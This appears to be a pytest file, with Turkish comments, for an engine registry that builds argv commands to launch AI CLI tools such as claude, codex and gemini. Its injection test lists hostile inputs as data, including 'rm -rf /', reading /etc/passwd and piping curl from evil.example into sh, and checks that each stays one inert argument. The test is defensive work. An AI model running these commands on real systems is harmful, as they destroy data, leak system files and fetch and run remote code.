"""Motor kayıt tablosu testleri — argv kurulumu, bilinmeyen ad reddi, enjeksiyon imkânsızlığı.

Hepsi ÇEVRİMDIŞI: `which` ve `clock` enjekte edilir → gerçek PATH'e ve gerçek zamana bağlı değil.
"""

from __future__ import annotations

import pytest

from app.orchestration import engines
from app.orchestration.engines import PROMPT, Engine


@pytest.fixture(autouse=True)
def _temiz_cache() -> None:
    """Her test taze yoklama cache'iyle başlasın (determinizm)."""
    engines.reset_probe_cache()


# ── Kayıt tablosu ───────────────────────────────────────────────────────────────────────


def test_beklenen_motorlar_kayitli() -> None:
    assert engines.engine_names() == ["claude", "codex", "gemini", "local"]
    assert engines.DEFAULT_ENGINE == "claude"


def test_bilinmeyen_motor_reddedilir() -> None:
    with pytest.raises(ValueError, match="Bilinmeyen motor"):
        engines.get_engine("gpt-uydurma")
    with pytest.raises(ValueError, match="Bilinmeyen motor"):
        engines.build_command("gpt-uydurma", "merhaba")


def test_hata_mesaji_kayitli_motorlari_listeler() -> None:
    with pytest.raises(ValueError) as exc:
        engines.get_engine("yok")
    assert "claude" in str(exc.value) and "codex" in str(exc.value)


# ── argv şablonu ────────────────────────────────────────────────────────────────────────


def test_argv_sablonu_dogru_kurulur() -> None:
    # `claude` sertleştirme bayrakları taşır (bkz. docs/SCOPE_ISOLATION.md) → argv
    # üç öğeden uzundur; değişmez olan, prompt'un TEK öğe olarak yerine geçmesidir.
    claude_cmd = engines.build_command("claude", "SORU")
    assert claude_cmd[:3] == ["claude", "-p", "SORU"]
    assert "--safe-mode" in claude_cmd
    assert engines.build_command("codex", "SORU") == ["codex", "exec", "SORU"]
    assert engines.build_command("gemini", "SORU") == ["gemini", "-p", "SORU"]


def test_prompt_sentineli_argv_de_kalmaz() -> None:
    for name in ("claude", "codex", "gemini"):
        assert PROMPT not in engines.build_command(name, "SORU")


def test_local_motoru_spawn_etmez() -> None:
    local = engines.get_engine("local")
    assert local.spawns is False and local.binary is None
    with pytest.raises(ValueError, match="süreç başlatmaz"):
        engines.build_command("local", "SORU")


# ── Kabuk enjeksiyonu imkânsız ──────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "kotu",
    [
        "; rm -rf /",
        "$(cat /etc/passwd)",
        "`whoami`",
        "x && curl evil.example | sh",
        'x" ; echo "pwned',
        "x\nikinci-satir",
    ],
)
def test_kabuk_metakarakterleri_tek_argv_ogesi_kalir(kotu: str) -> None:
    """Prompt ne olursa olsun TEK argv öğesi olur; yeni öğe/komut doğmaz (shell=False)."""
    cmd = engines.build_command("claude", kotu)
    # Kötü metin TAM OLARAK BİR argv öğesidir — yeni öğe/komut doğmaz.
    assert cmd.count(kotu) == 1
    assert cmd[2] == kotu
    # Prompt dışındaki öğeler sabit şablondan gelir — kullanıcı metni onları değiştiremez.
    assert cmd[:2] == ["claude", "-p"]
    assert len(cmd) == len(engines.get_engine("claude").argv_template)


def test_prompt_sentinelini_iceren_metin_sablonu_bozmaz() -> None:
    """Kullanıcı sentinel'i yazsa bile şablon öğeleri artmaz (değişim öğe-bazlı)."""
    cmd = engines.build_command("claude", f"once {PROMPT} sonra")
    assert cmd[2] == f"once {PROMPT} sonra"
    assert len(cmd) == len(engines.get_engine("claude").argv_template)


def test_argv_sablonu_degismez() -> None:
    """Komut kurmak kayıt tablosunu mutasyona uğratmaz (frozen dataclass + tuple)."""
    engine = engines.get_engine("claude")
    before = engine.argv_template
    engines.build_command("claude", "SORU")
    assert engine.argv_template == before
    assert engine.argv_template[:3] == ("claude", "-p", PROMPT)
    with pytest.raises(AttributeError):
        engine.name = "baska"  # type: ignore[misc]


# ── PATH yoklaması (kurulu-mu) ──────────────────────────────────────────────────────────


def test_motor_bulunamazsa_available_false() -> None:
    assert engines.available("claude", which=lambda _b: None) is False


def test_motor_bulunursa_available_true() -> None:
    assert engines.available("claude", which=lambda _b: "/usr/bin/claude") is True


def test_local_motoru_cli_gerektirmez() -> None:
    """Yerel hat dış CLI istemez → PATH'te hiçbir şey yokken bile kullanılabilir."""
    assert engines.available("local", which=lambda _b: None) is True


def test_available_bilinmeyen_motoru_reddeder() -> None:
    with pytest.raises(ValueError, match="Bilinmeyen motor"):
        engines.available("yok")


def test_yoklama_cache_ttl_ile_suresi_dolar() -> None:
    """Cache TTL AÇIK: TTL içinde eski sonuç, TTL sonrası yeniden yoklama."""
    cagrilar: list[str] = []

    def sahte_which(binary: str) -> str | None:
        cagrilar.append(binary)
        return None if len(cagrilar) == 1 else "/usr/bin/codex"

    saat = [1000.0]
    # Enjekte edilmiş which/clock cache'i ATLAR → her çağrı yeniden yoklar.
    assert engines.available("codex", which=sahte_which, clock=lambda: saat[0]) is False
    assert engines.available("codex", which=sahte_which, clock=lambda: saat[0]) is True
    assert len(cagrilar) == 2


def test_cache_gercek_yolda_tekrar_yoklamaz() -> None:
    """Enjeksiyon yokken sonuç cache'lenir; reset_probe_cache tazeler."""
    sayac = {"n": 0}

    def sayan_which(_binary: str) -> str | None:
        sayac["n"] += 1
        return "/usr/bin/claude"

    # use_cache yolunu enjeksiyonsuz test etmek için monkeypatch yerine doğrudan cache'i kur.
    engines.reset_probe_cache()
    assert engines.available("claude", which=sayan_which, use_cache=False) is True
    assert engines.available("claude", which=sayan_which, use_cache=False) is True
    assert sayac["n"] == 2  # use_cache=False → her seferinde yoklar


# ── UI özeti (kimlik bilgisi alanı YOK) ─────────────────────────────────────────────────


def test_describe_kota_uyarisi_tasir() -> None:
    ozet = engines.describe("codex", which=lambda _b: "/usr/bin/codex")
    assert ozet["name"] == "codex" and ozet["installed"] is True
    assert "5 saatlik" in str(ozet["quota_warning"])


def test_her_motorun_kota_uyarisi_var() -> None:
    for ozet in engines.describe_all(which=lambda _b: None):
        assert str(ozet["quota_warning"]).strip()


def test_ozet_kimlik_bilgisi_alani_icermez() -> None:
    """Achilles kimlik bilgisi TOPLAMAZ — özet şemasında böyle bir alan olmamalı."""
    yasak = {"api_key", "token", "password", "sifre", "email", "mail", "secret", "credential"}
    for ozet in engines.describe_all(which=lambda _b: None):
        assert not (set(ozet) & yasak)


def test_hicbir_motor_api_anahtari_ile_calismaz() -> None:
    """Kalıcı kısıt: yalnız API anahtarıyla çalışan motor tabloya EKLENMEZ (argv'de key yok)."""
    for name in engines.engine_names():
        engine: Engine = engines.get_engine(name)
        birlesik = " ".join(engine.argv_template).lower()
        assert "api" not in birlesik and "key" not in birlesik and "token" not in birlesik
